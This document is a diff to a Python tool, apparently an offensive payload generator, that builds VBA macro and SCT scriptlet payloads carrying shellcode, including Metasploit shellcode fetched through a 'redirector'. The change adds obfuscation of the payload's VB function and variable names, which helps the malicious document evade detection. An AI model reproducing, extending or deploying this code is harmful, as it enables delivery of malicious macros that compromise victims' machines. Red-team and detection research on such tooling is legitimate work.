@@ -7,7 +7,7 @@ from fileops import fileFindReplace, getFileStringLineNum
 import re
 from os import system
 from sys import exit
-from encoder import encodeStringAsChr, convertToVBAFormat
+from encoder import *
 import itertools
 
 '''
@@ -63,6 +63,9 @@ def genVBAMacro(template, shellCode, x86, x64):
 	fileFindReplace('payload.sct', 'exampleprogid', genProgID())
 	fileFindReplace('payload.sct', 'exampleclassid', str(genClassID()))
 	fileFindReplace('payload.sct', 'Array()', shellCode.rstrip())
+	obfuscateVBFunctions('payload.sct')
+	obfuscateVBVariables('payload.sct')
+	copyfile('payload.sct', 'obfuscate.sct')
 
 	textToEncode = ''
 	textToEncodeList = []
@@ -103,8 +106,8 @@ def genVBAMacro(template, shellCode, x86, x64):
 			else:
 				payloadFile.write(item)
 
-	print(textToEncode)
-	print(start + encodedList + end)
+	# for i in start + textToEncodeList + end:
+	# 	print(i)
 
 def getMetasploitShellCode(redirector):
 	'''
